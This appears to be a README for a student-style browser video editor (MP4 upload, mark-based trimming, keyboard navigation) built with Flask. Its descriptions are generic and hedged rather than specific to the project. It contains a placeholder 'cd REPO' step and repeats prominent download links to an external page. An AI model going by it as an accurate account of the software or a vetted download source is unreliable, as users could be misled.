# Accessible Video Editor v0.1 - web video editor 2026

> **Accessible Video Editor is a web-based video editing tool for MP4 workflows that emphasizes keyboard navigation, WCAG-informed interaction, and quick selection-based editing in version 0.1.**

[![Platform](https://img.shields.io/badge/Platform-web-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v0.1-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/swood433/course-project-avide-cat-win-2520?style=flat-square)](https://github.com/swood433/course-project-avide-cat-win-2520)

---

<p align="center">
  <a href="https://swood433.github.io/course-project-avide-cat-win-2520/">
    <img src="https://img.shields.io/badge/Download-Accessible%20Video%20Editor%20Latest-brightgreen?style=for-the-badge" alt="Download Accessible Video Editor">
  </a>
</p>

> **[Direct Download - Accessible Video Editor v0.1](https://swood433.github.io/course-project-avide-cat-win-2520/)**

---

[Download Latest Build](https://swood433.github.io/course-project-avide-cat-win-2520/)

---

## About Accessible Video Editor

Accessible Video Editor is a browser-based editing interface built around straightforward MP4 handling, timeline selection, and usable navigation. It is designed with accessibility in mind, making it a practical fit for users who rely on keyboard-first workflows, clear alerts, and interface patterns that support WCAG-oriented design.

The project is centered on efficient editing tasks rather than complex production features. It helps users upload a clip, choose a segment, refine it with trim or delete actions, and export the selected result without leaving the web app. Because the interface includes alerts with timestamps and visible playback controls, it can also support review-heavy workflows where feedback and status tracking matter.

---

## Features

- Upload and edit MP4 videos directly in the web interface
- Use playback controls with seek buttons for precise navigation
- Define edits with mark-based selection tools
- Trim, delete, and download the selected portion
- Move through the editor with accessible navigation and keyboard shortcuts
- Review alert history with timestamps and downloadable records
- Benefit from theme and styling updates focused on accessibility
- Built with a web stack that includes Flask and HTML

---

## Installation

Clone the repository or download the source, then open the project in your local development environment.

```bash
git clone https://github.com/swood433/course-project-avide-cat-win-2520.git
cd REPO
```

If the project includes a Flask backend, start the app with your preferred Python entry point and open it in a browser. For static or classroom-hosted builds, launch the provided web page directly after loading the project files.

---

## Usage

1. Open the app in a browser.
2. Upload an MP4 file.
3. Use playback controls and seek buttons to move through the video.
4. Set marks to define the section you want to work on.
5. Trim or delete the selected range.
6. Download the resulting selection when ready.
7. Check the alert history if you need a timestamped record of actions.

Keyboard shortcuts can be used for faster movement where supported, especially when working without a mouse.

---

## Configuration

Settings are typically handled through the application interface and its web assets. If your build includes server-side options, look for the Flask configuration or environment variables used by the project.

Example structure:

```ini
APP_ENV=development
DEBUG=true
```

Accessibility-related styling, theme choices, and interface behavior may also be adjusted in the HTML/CSS layer depending on the version you are running.

---

## Requirements

- A modern web browser
- MP4 input files for editing
- HTML-based frontend assets
- Flask if running the project with a Python-backed local server
- Enough local storage for uploaded media and exported selections

---

## FAQ

**How do I update to the latest build?**  
Use the download link above or pull the newest version from the repository when a new release is available.

**Where are alerts and action records stored?**  
The app includes alert history with timestamps; depending on your build, records may be viewable in the interface and available for download.

**Can I use keyboard navigation throughout the editor?**  
Yes, keyboard-friendly interaction is a core part of the interface design.

**What if the video does not load?**  
Check that the file is an MP4, confirm your browser supports the format, and make sure the app has access to the file or server location.

**Where should I change visual settings?**  
Look in the interface settings or the project’s HTML and styling files, where accessibility-oriented theme updates are applied.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
